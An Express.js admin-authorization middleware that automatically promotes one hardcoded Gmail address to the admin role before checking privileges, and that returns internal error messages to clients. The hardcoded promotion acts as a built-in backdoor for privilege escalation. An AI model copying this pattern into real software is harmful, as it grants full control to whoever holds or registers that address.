const User = require('../models/User');

module.exports = async function adminMiddleware(req, res, next) {
  try {
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Auto promote support email to admin if needed
    if (user.email === 'contact.scaleupweb@gmail.com' && user.role !== 'admin') {
      user.role = 'admin';
      await user.save();
    }

    if (user.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied. Super Admin privileges required.' });
    }

    next();
  } catch (error) {
    res.status(500).json({ message: 'Admin authorization error', error: error.message });
  }
};
